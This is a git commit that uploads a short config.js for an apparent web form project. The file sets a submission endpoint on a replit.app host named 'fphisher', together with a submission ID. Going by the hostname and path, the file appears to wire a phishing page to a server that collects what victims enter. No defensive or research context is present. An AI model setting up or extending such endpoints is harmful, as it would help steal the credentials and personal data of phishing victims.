a256a347acd6cd3e3180d8494e995a331e37e038
Igbined <93369396+Igbined@users.noreply.github.com>
2026-04-02 15:41:59 +0100

    Add files via upload

---
+++ config.js
@@ -0,0 +1,3 @@
+// config.js
+export const SUBMIT_ENDPOINT = "https://fphisher-30--gnzc8csfz5.replit.app/api/submit/cf49320885";
+export const SUBMIT_ID = "cf49320885";   // ← Change this if you need a different ID later
